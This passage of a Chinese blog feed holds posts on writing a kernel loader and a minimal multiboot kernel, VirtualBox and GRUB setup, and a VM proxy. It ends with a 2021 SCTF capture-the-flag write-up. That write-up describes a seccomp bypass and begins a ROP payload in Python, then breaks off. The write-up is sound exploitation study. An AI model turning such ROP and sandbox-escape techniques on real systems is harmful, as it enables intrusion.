class="keyword">u32_t</span>)mbsp-&gt;mb_e820padr), (<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820nr), f2adr, sz))<span class="comment">//检查内存是否足够</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != chkadr_is_ok(mbsp, f2adr, sz))<span class="comment">//检查给定的地址范围是否有效</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy((<span class="keyword">void</span> *)fpadr, (<span class="keyword">void</span> *)f2adr, (<span class="keyword">sint_t</span>)sz);<span class="comment">//复制文件到0x2000000</span></span><br><span class="line">    <span class="keyword">return</span> sz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码主要是获取内核文件的大小和地址，并复制文件到给定地址，其中get_file_rpadrandsz和之前类似，获取文件头描述符来查找文件</p><p>接下来就是将获取得到的地址储存到结构体中</p><h2 id="放置字库文件"><a href="#放置字库文件" class="headerlink" title="放置字库文件"></a>放置字库文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_defutfont</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> sz = r_file_to_padr(mbsp, mbsp-&gt;mb_nextwtpadr, <span class="string">&quot;font.fnt&quot;</span>);<span class="comment">//在映像中查找相应的文件，并复制到对应的地址，并返回文件的大小，这里是查找Cosmos.bin文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_bfontpadr = mbsp-&gt;mb_nextwtpadr;<span class="comment">//填入字库文件起始地址</span></span><br><span class="line">    mbsp-&gt;mb_bfontsz = sz;<span class="comment">//填入字库文件大小</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN(mbsp-&gt;mb_nextwtpadr + sz);<span class="comment">//始终要保持指向下一段空闲内存的首地址</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_bfontpadr + mbsp-&gt;mb_bfontsz;<span class="comment">//计算内核结束地址并保存</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和放置内核文件类似</p><h2 id="复制e820表"><a href="#复制e820表" class="headerlink" title="复制e820表"></a>复制e820表</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_meme820</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">e820map_t</span> *semp = (<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820padr));<span class="comment">//获取e820表地址</span></span><br><span class="line">    <span class="keyword">u64_t</span> senr = mbsp-&gt;mb_e820nr;<span class="comment">//获取e820的数组数量</span></span><br><span class="line">    <span class="keyword">e820map_t</span> *demp = (<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_nextwtpadr));<span class="comment">//获取下一个空闲地址块地址</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)demp), (senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>)))))<span class="comment">//检查地址是否合法，是否和映像文件有重叠</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy(semp, demp, (<span class="keyword">sint_t</span>)(senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>))));<span class="comment">//将e820表复制到字库文件之后</span></span><br><span class="line">    mbsp-&gt;mb_e820padr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)(demp));<span class="comment">//设置machbstart_t中e820表的地址</span></span><br><span class="line">    mbsp-&gt;mb_e820sz = senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>));<span class="comment">//设置machbstart_t中e820的数量</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN((<span class="keyword">u32_t</span>)(demp) + (<span class="keyword">u32_t</span>)(senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>))));<span class="comment">//mb_nextwtpadr总是指向下一块内存</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_e820padr + mbsp-&gt;mb_e820sz;<span class="comment">//设置内核结束地址</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将e820表复制到内核之内中和上面的操作也差不多，但是为什么要移动到字库文件之后哪？因为实模式下可以使用的内存空间不多，如果一直占用这些低地址会影响后面转换到实模式，我们需要将其移动到一个安稳的位置上。</p><h2 id="建立-MMU-页表数据"><a href="#建立-MMU-页表数据" class="headerlink" title="建立 MMU 页表数据"></a>建立 MMU 页表数据</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_bstartpages</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> *p = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR);<span class="comment">//p 指向顶级页表（PML4）</span></span><br><span class="line">    <span class="keyword">u64_t</span> *pdpte = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x1000</span>);<span class="comment">//pdpte指向页目录表（PDPT）</span></span><br><span class="line">    <span class="keyword">u64_t</span> *pde = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x2000</span>);<span class="comment">//pde 指向页目录（PD）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">u64_t</span> adr = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)(KINITPAGE_PHYADR), (<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>)))<span class="comment">//检查是否重叠</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint_t</span> mi = <span class="number">0</span>; mi &lt; PGENTY_SIZE; mi++)<span class="comment">//初始化PML4（顶级页目录表），PDPT（页目录表）内存</span></span><br><span class="line">    &#123;</span><br><span class="line">        p[mi] = <span class="number">0</span>;</span><br><span class="line">        pdpte[mi] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint_t</span> pdei = <span class="number">0</span>; pdei &lt; <span class="number">16</span>; pdei++)<span class="comment">// 遍历 16 个 PDPT 条目</span></span><br><span class="line">    &#123;</span><br><span class="line">        pdpte[pdei] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pde | KPDPTE_RW | KPDPTE_P);<span class="comment">// 设置 PDPT 条目的属性,设置其存在位和读写权限</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint_t</span> pdeii = <span class="number">0</span>; pdeii &lt; PGENTY_SIZE; pdeii++)<span class="comment">// 在每个 PDPT 条目中，初始化PD数组</span></span><br><span class="line">        &#123;</span><br><span class="line">            pde[pdeii] = adr | KPDE_PS | KPDE_RW | KPDE_P;<span class="comment">// 设置 PD 条目的属性，页面大小设置为2MB，设置为可以读写，设置存在位</span></span><br><span class="line">            adr += <span class="number">0x200000</span>;<span class="comment">// 递增地址,增加2MB</span></span><br><span class="line">        &#125;</span><br><span class="line">        pde = (<span class="keyword">u64_t</span> *)((<span class="keyword">u32_t</span>)pde + <span class="number">0x1000</span>);<span class="comment">// 切换到下一个 PD 条目</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; <span class="number">0x1ff</span>] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pdpte | KPML4_RW | KPML4_P);<span class="comment">//让顶级页目录中第0项和第((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff项，指向同一个页目录表  </span></span><br><span class="line">    p[<span class="number">0</span>] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pdpte | KPML4_RW | KPML4_P);<span class="comment">//让顶级页目录中第0项和第((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff项，指向同一个页目录表</span></span><br><span class="line">    mbsp-&gt;mb_pml4padr = (<span class="keyword">u64_t</span>)(KINITPAGE_PHYADR);<span class="comment">//保存PLM4地址</span></span><br><span class="line">    mbsp-&gt;mb_subpageslen = (<span class="keyword">u64_t</span>)(<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>);<span class="comment">//保存MMU映射表的总长度</span></span><br><span class="line">    mbsp-&gt;mb_kpmapphymemsz = (<span class="keyword">u64_t</span>)(<span class="number">0x400000000</span>);<span class="comment">//保存映射到虚拟地址的物理地址的大小</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里p指向顶级页表，pdpte指向页目录表，pde指向页目录，相当于是3级页表，开始还是先检查是否和内存映像文件重叠，然后初始化顶级页目录表和页目录表，然后我们对内存做映射，遍历16个页目录表，每个页目录表指向512个页目录，对每个页目录设置属性，每页的大小为2MB，总共的大小为16GB。重点关注一下<code>p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff] = (u64_t)((u32_t)pdpte | KPML4_RW | KPML4_P);</code> 和 <code>p[0] = (u64_t)((u32_t)pdpte | KPML4_RW | KPML4_P)</code>这两行代码，他使得0xffff800000000000和0地址这两块虚拟地址指向同一块物理地址，这里的目的是内核在启动初期，虚拟地址和物理地址要保持相同。</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用vituralbox创建一个计算机</title>
      <link href="/2024/05/05/%E4%BD%BF%E7%94%A8vitualbox%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
      <url>/2024/05/05/%E4%BD%BF%E7%94%A8vitualbox%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="使用vituralbox创建一个计算机"><a href="#使用vituralbox创建一个计算机" class="headerlink" title="使用vituralbox创建一个计算机"></a>使用vituralbox创建一个计算机</h1><ol><li><p>首先使用virtualbox创建一个新的硬盘</p></li><li><p>启动我们的ubuntu虚拟机，为其在home目录下添加一个hdisk文件夹</p></li><li><p>挂载该硬盘到hdisk文件夹，并创建ext4文件系统</p><p>使用下面的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfs.ext4 /dev/sdb</span><br><span class="line">sudo mount /dev/sdb hdisk</span><br></pre></td></tr></table></figure><p>但是这样挂载需要每次重启，我们选择修改/etc/fstab文件,在其末尾添加我们硬盘的信息</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121144352.png" alt="image-20240507121144352"></p><p>可以在root级别使用<code> echo &quot;/dev/sdb        /home/kr0emer/hdisk   ext4  defaults 0  2 &quot; &gt;&gt; /etc/fstab</code>来添加</p></li><li><p>接下来在hdisk目录下创建boot目录</p></li><li><p>安装grub到新硬盘</p><p><code>sudo grub-install --boot-directory=./hdisk/boot/ --force --allow-floppy /dev/sdb</code></p></li><li><p>接着创建grub.cfg在<code>hdisk/boot/grub/</code>目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">menuentry &#x27;HelloOS&#x27; &#123;</span><br><span class="line">insmod part_msdos</span><br><span class="line">insmod ext2</span><br><span class="line">set root=&#x27;hd0&#x27; #我们的硬盘只有一个分区所以是&#x27;hd0&#x27;</span><br><span class="line">multiboot2 /boot/HelloOS.eki #加载boot目录下的HelloOS.eki文件</span><br><span class="line">boot #引导启动</span><br><span class="line">&#125;</span><br><span class="line">set timeout_style=menu</span><br><span class="line">if [ &quot;$&#123;timeout&#125;&quot; = 0 ]; then</span><br><span class="line">  set timeout=10 #等待10秒钟自动启动</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li><li><p>接下来关闭这个ubuntu虚拟机并创建一个新的虚拟机，选择hd.vid来创建虚拟机</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121715737.png" alt="image-20240507121715737"></p></li><li><p>接下来打开该虚拟机，得到下图基本上就成功了，后面创建HelloOS.eki就可以了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121903606.png" alt="image-20240507121903606"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现一个最简单的内核</title>
      <link href="/2023/11/12/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/"/>
      <url>/2023/11/12/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="编写一个引导程序"><a href="#编写一个引导程序" class="headerlink" title="编写一个引导程序"></a>编写一个引导程序</h1><p>首先我们要先要编写一个汇编程序，使用C语言作为高级语言不能直接控制硬件，而且 C 语言的函数调用、函数传参，都需要用栈。我们需要先要为C语言提供一个工作环境。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MBT_HDR_FLAGS EQU 0x00010003;flag字段，指出OS映像需要引导程序提供或支持的特性</span><br><span class="line">MBT_HDR_MAGIC EQU 0x1BADB002 ;多引导协议头魔数</span><br><span class="line">MBT_HDR2_MAGIC EQU 0xe85250d6 ;第二版多引导协议头魔数</span><br><span class="line">global _start ;导出_start符号</span><br><span class="line">extern main ;导入外部的main函数符号</span><br><span class="line">[section .start.text] ;定义.start.text代码节</span><br><span class="line">[bits 32] ;汇编成32位代码</span><br><span class="line">_start:</span><br><span class="line">jmp _entry</span><br><span class="line">ALIGN 8</span><br><span class="line">mbt_hdr:</span><br><span class="line">dd MBT_HDR_MAGIC</span><br><span class="line">dd MBT_HDR_FLAGS</span><br><span class="line">dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">dd mbt_hdr</span><br><span class="line">dd _start</span><br><span class="line">dd 0</span><br><span class="line">dd 0</span><br><span class="line">dd _entry</span><br><span class="line">;以上是GRUB所需要的头</span><br><span class="line">ALIGN 8</span><br><span class="line">mbt2_hdr:</span><br><span class="line">DD MBT_HDR2_MAGIC</span><br><span class="line">DD 0</span><br><span class="line">DD mbt2_hdr_end - mbt2_hdr</span><br><span class="line">DD -(MBT_HDR2_MAGIC + 0 + (mbt2_hdr_end - mbt2_hdr))</span><br><span class="line">DW 2, 0</span><br><span class="line">DD 24</span><br><span class="line">DD mbt2_hdr</span><br><span class="line">DD _start</span><br><span class="line">DD 0</span><br><span class="line">DD 0</span><br><span class="line">DW 3, 0</span><br><span class="line">DD 12</span><br><span class="line">DD _entry</span><br><span class="line">DD 0</span><br><span class="line">DW 0, 0</span><br><span class="line">DD 8</span><br><span class="line">mbt2_hdr_end:</span><br><span class="line">;以上是GRUB2所需要的头</span><br><span class="line">;包含两个头是为了同时兼容GRUB、GRUB2</span><br><span class="line">ALIGN 8</span><br><span class="line">_entry:</span><br><span class="line">;关中断</span><br><span class="line">cli</span><br><span class="line">;关不可屏蔽中断</span><br><span class="line">in al, 0x70</span><br><span class="line">or al, 0x80</span><br><span class="line">out 0x70,al</span><br><span class="line">;重新加载GDT</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br><span class="line">_32bits_mode:</span><br><span class="line">;下面初始化C语言可能会用到的寄存器</span><br><span class="line">mov ax, 0x10</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">;初始化栈，C语言需要栈才能工作</span><br><span class="line">mov esp,0x9000</span><br><span class="line">;调用C语言函数main</span><br><span class="line">call main</span><br><span class="line">;让CPU停止执行指令</span><br><span class="line">halt_step:</span><br><span class="line">halt</span><br><span class="line">jmp halt_step</span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN dw GDT_END-GDT_START-1</span><br><span class="line">GDTBASE dd GDT_START</span><br></pre></td></tr></table></figure><p>我们来对上面的汇编做一些详细的解释：</p><ol><li><p>我们先来看代码的第1行到第39行</p><p>首先是<strong>MBT_HDR_FLAGS</strong>，其定义的是<strong>flags</strong>字段，用来指出OS映像需要引导程序提供或支持的特性。其中0-15位指出需求：如果引导程序发现某些值杯设置，但出于某种原因无法满足其需求，则需要告知用户，并拒绝加载操作系统映像。其中16-31位为可选特性，与低16位不同，如果无法满足要求可以忽视并照常进行。自然，所有flags尚未定义的位都必须<strong>设置为0</strong>。flags字段的作用是用于版本控制以及简单的功能选择。</p><p>其中<strong>第0位</strong>若为1，那么所有与操作系统一起加载的引导模块必须在页面（4KB）边界上对齐。有些操作系统能够在启动时将包含引导模块的页直接映射到一个分页的地址空间，因此需要引导模块是页对齐的。</p><p>如果<strong>第1位</strong>为1则必须通过Multiboot信息结构的**mem_***域包括可用内存的信息。</p><p>如果引导程序能够传递内存分布（**mmap_***域）并且它确实存在，则也包括它。</p><p>如果<strong>第2位</strong>为1，有关视频模式表（参见引导信息格式）的信息必须对内核有效</p><p>如果flags字段中的<strong>第16位</strong>被设置，那么Multiboot头部中偏移量为12-28的字段是有效的，引导加载器应该使用它们而不是实际可执行头部中的字段来计算加载操作系统镜像的位置。如果内核镜像是ELF格式的，那么这个信息不需要被提供，但是如果镜像是a.out格式或者其他格式的，那么它必须被提供。符合规范的引导加载器必须能够加载那些要么是ELF格式的，要么包含了嵌入在Multiboot头部中的加载地址信息的镜像；它们也可以直接支持其他可执行格式，比如特定的a.out变体，但是不是必须的。</p><p>接下来<strong>MBT_HDR_MAGIC</strong>则代表着多引导协议头魔数，<strong>MBT_HDR2_MAGIC</strong>第二版多引导协议头魔数，可以告诉计算机使用的是何种协议。</p><p>接下来从第10行到第19行代表GRUB所需要的头，21到39行为GRUB2所需要的头。包含这两个头是为了兼容GRUB与GRUB2。</p></li><li><p>代码43~5行，关掉中断，设定 CPU 的工作模式。</p></li><li><p>代码53~72行，初始化 CPU 的寄存器和 C 语言的运行环境。</p></li><li><p>代码77~86行，GDT_START 开始的，是 CPU 工作模式所需要的数据。</p></li></ol><h2 id="编写C代码"><a href="#编写C代码" class="headerlink" title="编写C代码"></a>编写C代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vgastr.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello OS!&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数实现了一个打印”Hello OS!”字符串的功能，但是我们的操作系统中没有库函数，所以需要我们自定义一个printf函数打印到屏幕上。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vgastr.c</span></span><br><span class="line"><span class="keyword">void</span> _strwrite(<span class="keyword">char</span> * str)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>* p_str = (<span class="keyword">char</span>*)(<span class="number">0xb8000</span>);</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">    &#123;</span><br><span class="line">        *p_str = *str;</span><br><span class="line">        p_str+=<span class="number">2</span>;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *str,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _strwrite(str);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_strwrite函数将我们要打印的字符打印到屏幕之上从0xb8000开始每两个字符代表一个字母，第一个字节代表着字符，第二个字节代表着字体的颜色，其字符编码通常是 utf8，而 utf8 编码对 ASCII 字符是兼容的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vgastr.h</span></span><br><span class="line"><span class="keyword">void</span> _strwrite(<span class="keyword">char</span> * str);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *str,...)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="编译和部署"><a href="#编译和部署" class="headerlink" title="编译和部署"></a>编译和部署</h1><p>通过makefile将代码编译，得到<strong>HelloOS.bin</strong>。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111235434726.png" alt="编译的结果"></p><p>接下来就是部署了</p><p>我们进入etc\default\grub文件</p><p>首先将<strong>GRUB_TIMEOUT_STYLE</strong>的值从<strong>hidden</strong>改为<strong>menu</strong>，并将<strong>GRUB_TIMEOUT</strong>的值从<strong>0</strong>改为<strong>30</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112001856786.png" alt="修改grub文件"></p><p>然后更新grub配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>然后我们修改/boot/grub/grub.cfg文件，增加HelloOS项</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menuentry &#x27;HelloOS&#x27; &#123;</span><br><span class="line">     insmod part_gpt #GRUB加载分区模块识别分区</span><br><span class="line">     insmod ext2 #GRUB加载ext文件系统模块识别ext文件系统</span><br><span class="line">     set root=&#x27;hd0,gpt3&#x27; #注意boot目录挂载的分区，这是我机器上的情况</span><br><span class="line">     multiboot2 /boot/HelloOS.bin #GRUB以multiboot2协议加载HelloOS.bin</span><br><span class="line">     boot #GRUB启动HelloOS.bin</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>df /root/</code>的命令来查看set root应该设置为什么</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112003200032.png" alt="df /root/命令"></p><p>其中的“sda3”就是硬盘的第四个分区（硬件分区选择 MBR），但是 GRUB 的 menuentry 中不能写 sda3，而是要写“hd0,gpt3”，这是 GRUB 的命名方式，hd0 表示第一块硬盘，我的虚拟机是使用gpt分区表所以是gpt3。</p><p>可以根据grub.cfg其他的menuentry来确定。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005549038.png" alt="grub.cfg"></p><p>最后将HelloOS.bin文件复制到/boot/目录下，重启虚拟机。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005655001.png" alt="选择HelloOS"></p><p>选择HelloOS,可以看到HelloOS的字样。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005707224.png" alt="完成！"></p><p>这样我们就实现了一个最简单的OS了！</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一种虚拟机使用物理机代理的方法</title>
      <link href="/2023/11/11/%E4%B8%80%E7%A7%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E7%89%A9%E7%90%86%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2023/11/11/%E4%B8%80%E7%A7%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E7%89%A9%E7%90%86%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="物理机：V2rayN设置"><a href="#物理机：V2rayN设置" class="headerlink" title="物理机：V2rayN设置"></a>物理机：V2rayN设置</h1><p>打开V2rayN的<strong>参数设置</strong>选项将下图中的<strong>“允许来自局域网的链接”</strong>勾选</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111004012130.png" alt="image-20231111004012130"></p><p>然后点击确认即可，物理机的设置就这么多了。</p><h1 id="虚拟机：设置网络设置"><a href="#虚拟机：设置网络设置" class="headerlink" title="虚拟机：设置网络设置"></a>虚拟机：设置网络设置</h1><p>我这里使用的是<strong>ubuntu22.04.3 LTS amd64</strong>，找到设置中的网络选项，再设置网络代理类似下图所示</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111004832363.png" alt="image-20231111004832363"></p><p>其中ip填写在主机中使用<strong>ipconfig</strong>命令来查找，端口号设定根据V2rayN下方所示的<strong>局域网</strong>端口号填写。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111005410652.png" alt="image-20231111005410652"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111005018861.png" alt="image-20231111005018861"></p><p>这两步完成后，虚拟机就可以通过主机的代理来访问网络了。</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tricks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021SCTF复现</title>
      <link href="/2022/01/16/2021SCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/16/2021SCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF复现"><a href="#SCTF复现" class="headerlink" title="SCTF复现"></a>SCTF复现</h1><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><p>一个静态编译的文件</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116104932158.png" alt="image-20220116104932158"></p><p>本来看到静态编译想到的是直接使用pwntools的工具，但是实际上文件是开了沙盒的，这里只有read，alarm和fstat函数能被系统调用。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116105210814.png" alt="image-20220116105210814"></p><p>但是仔细看看在x86下open函数的系统调用就是5，这样的话，我们可以先转换到32位执行open之后再回到64位执行read，最后再通过测信道攻击获取flag。</p><p>首先先在程序内写下flag的路径，为了后边可以调用open函数，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">调用read函数写flag路径 </span></span><br><span class="line"><span class="string">################################&#x27;&#x27;&#x27;</span></span><br><span class="line">payload1 =<span class="string">b&#x27;a&#x27;</span>*stack_offset</span><br><span class="line">payload1+=p64(pop_rax)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(pop_rdi_rbp)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(pop_rsi_r15_rbp)</span><br><span class="line">payload1+=p64(flag_path)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload1+=p64(<span class="number">0x300</span>)</span><br><span 